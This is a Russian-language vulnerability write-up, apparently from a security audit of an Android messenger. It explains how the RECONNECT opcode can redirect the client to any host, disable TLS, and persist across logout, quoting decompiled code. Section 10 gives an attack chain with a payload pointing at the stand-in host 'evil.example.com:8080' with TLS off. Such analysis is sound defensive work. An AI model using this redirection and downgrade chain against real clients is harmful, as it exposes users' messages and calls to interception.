---
tags: [ws-protocol, reconnect, persistence, tls-downgrade, server-control, verified]
status: verified
severity: CRITICAL
sources:
  - defpackage/fef.java
  - defpackage/pb8.java:370-400
  - defpackage/ri9.java
  - defpackage/yag.java
  - defpackage/f4.java
  - defpackage/tk6.java
  - defpackage/ue4.java
  - defpackage/jvk.java
  - defpackage/bmh.java
  - defpackage/f3e.java
  - defpackage/gn9.java
  - defpackage/wng.java
  - defpackage/q58.java
  - defpackage/tch.java
  - defpackage/k4k.java
  - defpackage/m86.java
  - res/xml/network_security_config.xml
related:
  - "[[wave1/05-ws-server-actions]]"
  - "[[topics/20-ws-protocol-opcodes]]"
  - "[[wave2/07-chain-attacks]]"
---

# WS-опкод RECONNECT (код 3) — Полная верификация persistence и TLS downgrade

## TL;DR

Сервер отправляет опкод 3 (RECONNECT) с произвольным `redirectHost` (host:port) и `tls` (boolean). Клиент **без какой-либо валидации** сохраняет эти значения в SharedPreferences файл `user_prefs` под ключами `server.host`, `server.port`, `server.useTls`. Эти значения **переживают полный logout** (метод `ri9.c()` явно сохраняет и восстанавливает их после `clear()`). Единственная «валидация» endpoint — regex `^[a-zA-Z][a-zA-Z0-9+.-]*://\S+$` в `m86.a` — проверяет только формат URL, не домен. `network_security_config.xml` **не** разрешает cleartext для произвольных доменов (только Mobile ID операторов), но это не защищает raw TCP-сокет, который использует основной протокол.

---

## 1. Парсинг RECONNECT — `fef.java`

```java
// defpackage/fef.java — полный класс
public final class fef extends jei {
    public String c;     // redirectHost — формат "host:port"
    public boolean d;    // tls — default true (в конструкторе без аргументов)

    public fef(kxa kxaVar) {
        super(kxaVar);
        this.d = true;   // default: TLS включён
    }

    // Парсинг полей из бинарного протокола
    public final void c(kxa kxaVar, String str) {
        if (str.equals("tls")) {
            this.d = kxaVar.L0();           // boolean — может быть false!
        } else if (str.equals("redirectHost")) {
            this.c = j8h.U(kxaVar);         // произвольная строка, без валидации
        } else {
            kxaVar.C();                      // skip unknown field
        }
    }

    // Извлечение host из "host:port"
    public final String d() {
        if (ti3.H(this.c) || this.c.indexOf(":") <= 0) return null;
        return this.c.substring(0, this.c.indexOf(":"));
    }

    // Извлечение port из "host:port"
    public final String e() {
        int idx = this.c.indexOf(":");
        if (ti3.H(this.c) || idx <= 0) return null;
        return this.c.substring(idx + 1);
    }
}
```

**Вывод:** Никакой валидации `redirectHost`. Принимается любая строка формата `anything:port`.

---

## 2. Обработчик в `pb8.java` (строки ~380-400)

```java
// pb8.java — case s == 3 (RECONNECT opcode)
if (s == 3) {
    boolean z = jeiVar == jei.b;  // пустой reconnect = "reconnect to same"
    yzb yzbVar4 = ((owb) this.c).b.w;
    
    if (z) {
        fefVar = new fef();       // пустой: d=true, c=null
        fefVar.d = true;
    } else {
        fefVar = (fef) jeiVar;    // данные из сервера
    }

    // Логирование (без валидации!)
    // "onReconnect: host=X port=Y"

    // СОХРАНЕНИЕ В PREFS — БЕЗ ВАЛИДАЦИИ
    if (fefVar.c.length() > 0) {
        ri9 ri9Var = yzbVar4.a().a;
        // server.host = новый host
        ri9Var.q0.y(ri9Var, ri9.f1[3], fefVar.d());
        // server.port = новый port
        yzbVar4.a().a.Y(fefVar.e());
        // server.useTls = может быть FALSE
        ri9 ri9Var2 = yzbVar4.a().a;
        ri9Var2.s0.y(ri9Var2, ri9.f1[5], Boolean.valueOf(fefVar.d));
    }

    // ПЕРЕЗАПУСК СОЕДИНЕНИЯ
    uei ueiVar3 = yzbVar4.n;
    if (ueiVar3 != null) {
        ct4.E(uei.H0, "restart");
        ((pwb) ((vei) ueiVar3.C0.getValue()).X.get()).v(false);
        ((ExecutorService) ueiVar3.F0.getValue()).execute(new nei(0, ueiVar3));
    }
}
```

**Вывод:** Прямая запись в SharedPreferences без whitelist, regex, или проверки домена.

---

## 3. Хранение — `ri9.java` (extends `yag` extends `f4`)

### SharedPreferences файл

```java
// ri9 конструктор:
super(context, lg9Var.a("user", "prefs"), vs6Var);
// → файл: /data/data/ru.oneme.app/shared_prefs/{userId}_user_prefs.xml
```

### Ключи

| Ключ | Тип | Default | Поле |
|------|-----|---------|------|
| `server.host` | String | null | `ri9.q0` |
| `server.port` | String | null | `ri9.r0` |
| `server.useTls` | Boolean | **TRUE** | `ri9.s0` |

### Геттеры

- `ri9.L()` → `server.host` (getServerHost)
- `ri9.M()` → `server.port` (getServerPort)
- `ri9.O()` → `server.useTls` (getUseTls)
- `ri9.Y(str)` → setter для `server.port`

---

## 4. Persistence через logout — ПОДТВЕРЖДЕНО

### Механизм reset: `ri9.c()` override

```java
// ri9.c() — вызывается при logout через f3e.a() → ri9.c()
public final void c() {
    // ШАГ 1: СОХРАНИТЬ текущие значения в локальные переменные
    String strL = L();           // server.host
    String strM = M();           // server.port
    boolean zO = O();            // server.useTls
    // ... сохраняет ещё ~20 полей ...

    // ШАГ 2: ОЧИСТИТЬ ВСЕ PREFS
    super.c();  // → f4.c() → SharedPreferences.edit().clear().apply()

    // ШАГ 3: ВОССТАНОВИТЬ server.host/port/useTls!
    this.q0.y(this, h29VarArr[3], strL);   // server.host = старое значение
    Y(strM);                                // server.port = старое значение
    this.s0.y(this, h29VarArr[5], Boolean.valueOf(zO));  // server.useTls = старое
    // ... восстанавливает ещё ~20 полей ...
}
```

### Цепочка вызовов при logout

```
gn9.java:149 → ((f3e) this.a.getValue()).a()
  → f3e.a() → this.a.c() [ri9.c()]
    → super.c() [yag.c() → f4.c() → clear()]
    → ВОССТАНОВЛЕНИЕ server.host/port/useTls
```

**ВЫВОД: `server.host`, `server.port`, `server.useTls` ПЕРЕЖИВАЮТ ПОЛНЫЙ LOGOUT.**

Даже после logout + re-login клиент будет подключаться к серверу, указанному в последнем RECONNECT.

---

## 5. Валидация redirectHost — ОТСУТСТВУЕТ

### Единственная проверка (для calls WS, не для основного протокола)

```java
// tch.java — access$validateEndpoint
public static final void access$validateEndpoint(tch tchVar) {
    m86 m86Var = tchVar.C;
    String str = tchVar.s;
    if (!m86.a.b(str)) {
        throw new BadEndpointException(tchVar.s);
    }
}

// m86.java — regex
public static final ckf a = new ckf("^[a-zA-Z][a-zA-Z0-9+.-]*://\\S+$");
```

Это проверяет только что строка — валидный URL (любая схема, любой домен). **Это НЕ whitelist.**

### Для основного протокола (tk6.java)

В `tk6.java` при создании соединения:
```java
String strL = f3eVar.a.L();  // server.host
if (strL == null) {
    strL = "api.oneme.ru";   // fallback по умолчанию
}
// Никакой проверки что strL — легитимный домен MAX!
```

**ВЫВОД: Нет whitelist, нет проверки домена, нет certificate pinning для основного протокола.**

---

## 6. TLS downgrade при `tls=false`

### Основной протокол (TCP-сокет через `tk6` → `jvk`)

Соединение создаётся через `tk6.java`:
```java
ue4 ue4Var = new ue4(strL, str, f3eVar2.a.O());
// ue4.a = host, ue4.b = port, ue4.c = useTls
```

Socket factory создаётся через `bmh.a(str)` — **всегда SSLSocketFactory**. Однако в `jvk.c()`:
```java
// После TCP connect:
if (!(socketCreateSocket instanceof SSLSocket)) {
    // "connectTls, no tls required for" — ПРОПУСК TLS!
    return socketCreateSocket;
}
// Иначе — TLS handshake
```

Ключевой момент: `tk6.d` (параметр `z2` = `isValidationRequired`) передаётся в `bmh.b(sSLSocket, str, tk6Var.d)`. Если `useTls=false`, socket factory может вернуть plain socket → TLS пропускается.

### Calls WS (OkHttp через `k4k`)

Для calls signaling используется OkHttp WebSocket (`k4k.safelyCreateNewSocket`):
```java
cj5 cj5Var = new cj5(3);
cj5Var.h(str);  // URL строка
```

В `cj5.h()`:
```java
if (w0i.k0(str, "ws:", true)) {
    str = "http:".concat(str.substring(3));   // ws:// → http://
} else if (w0i.k0(str, "wss:", true)) {
    str = "https:".concat(str.substring(4));  // wss:// → https://
}
```

Если URL начинается с `ws://` — OkHttp использует plain HTTP (без TLS).

### network_security_config.xml

```xml
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain>mobileid.megafon.ru</domain>
        <domain>idgw.mobileid.mts.ru</domain>
        <domain>hhe.mts.ru</domain>
        <domain>he-mc.tele2.ru</domain>
        <domain>he-mc.t2.ru</domain>
        <domain>balance.beeline.ru</domain>
    </domain-config>
</network-security-config>
```

**Cleartext разрешён ТОЛЬКО для Mobile ID доменов.** Однако:
- Основной протокол использует **raw TCP socket** (не HttpURLConnection), поэтому `NetworkSecurityPolicy.isCleartextTrafficPermitted()` **не проверяется автоматически** — это ответственность приложения.
- OkHttp проверяет cleartext policy, но только если приложение не переопределяет socket factory.

**ВЫВОД: Для основного протокола (raw TCP) network_security_config НЕ является защитой. TLS downgrade через RECONNECT(tls=false) работает.**

---

## 7. Где читается `ri9.serverHost` — scope воздействия

| Класс | Использование | Scope |
|-------|---------------|-------|
| `tk6.java` | Основной TCP-протокол (159 опкодов) | **ВСЕ сообщения, звонки, sync** |
| `wng.java` | DevMenu UI (отображение текущего сервера) | UI only |
| `q58.java` | DevMenu — ручная смена сервера | UI only |
| `sl9.java` | Статистика (ri9Var.l() — callsLastSync) | Не serverHost |

**ВЫВОД: `server.host` используется для ВСЕГО основного протокола — все 159 опкодов, все сообщения, все звонки, все sync-операции идут через этот host.**

API-запросы (HTTP) идут через отдельный механизм (`api.oneme.ru` hardcoded в `yc9`), но WS-протокол — это основной канал данных.

---

## 8. ServerHostSelector (topic 495) — связь

Поиск по `ServerHostSelector`, `serverHostSelector`, `server_host_selector` в декомпиляции — **не найдено**. Класс `ServerHostBottomSheet` (`one.me.devmenu.tools.server`) — это UI DevMenu для ручной смены сервера, не автоматический selector.

В `o2.java` case 21 найдена ссылка:
```java
return new rc6(lkc.g(((i58) obj).a, "host-reachability", 0, 2, true, false, 1, 2));
```

Это `HostReachability` — проверка доступности хоста, но не selector/whitelist.

**ВЫВОД: Нет ServerHostSelector как whitelist-механизма. Нет автоматической ротации с валидацией.**

---

## 9. PmsKey и server.host

Ключи `server.host`, `server.port`, `server.useTls` — это **НЕ PmsKey**. Они хранятся в отдельном SharedPreferences файле `{userId}_user_prefs.xml` как обычные preference-ключи класса `ri9`.

PmsKey хранятся в отдельном файле через `rtd` (класс серверных настроек). Однако PmsKey `conntimeouts` (через `fg4`) влияет на таймауты подключения к серверу, указанному в `server.host`.

---

## 10. Полная цепочка атаки

```
1. Сервер → WS опкод 3 (RECONNECT)
   payload: { redirectHost: "evil.example.com:8080", tls: false }

2. Клиент (pb8.java):
   - ri9.server.host = "evil.example.com"
   - ri9.server.port = "8080"
   - ri9.server.useTls = false
   - SharedPreferences записаны на диск

3. Клиент перезапускает соединение (pwb.v(false))
   → tk6 создаёт ue4("evil.example.com", "8080", false)
   → jvk.d() подключается к evil.example.com:8080
   → TLS НЕ применяется (useTls=false)

4. Весь трафик 159 опкодов идёт в cleartext на evil.example.com

5. При logout:
   - ri9.c() → clear() → ВОССТАНОВЛЕНИЕ server.host/port/useTls
   - После re-login клиент СНОВА подключается к evil.example.com

6. При перезапуске приложения:
   - SharedPreferences читаются с диска
   - Клиент подключается к evil.example.com

7. Единственный способ сброса:
   - Очистка данных приложения (Settings → Apps → Clear Data)
   - Или получение нового RECONNECT с легитимным host
```

---

## Резюме находок

| Вопрос | Ответ |
|--------|-------|
| SharedPreferences файл | `{userId}_user_prefs.xml` |
| Ключ host | `server.host` |
| Ключ port | `server.port` |
| Ключ TLS | `server.useTls` (default: true) |
| Валидация host | **НЕТ** (никакой) |
| Whitelist доменов | **НЕТ** |
| Certificate pinning | **НЕТ** для основного протокола |
| Переживает logout | **ДА** (явное сохранение/восстановление в ri9.c()) |
| Переживает перезапуск | **ДА** (SharedPreferences на диске) |
| Scope воздействия | ВСЕ 159 опкодов основного протокола |
| TLS downgrade возможен | **ДА** (tls=false → plain TCP) |
| network_security_config защищает | **НЕТ** (raw TCP, не HTTP) |
| ServerHostSelector/whitelist | **НЕ СУЩЕСТВУЕТ** |
| PmsKey? | **НЕТ** — отдельные prefs-ключи |
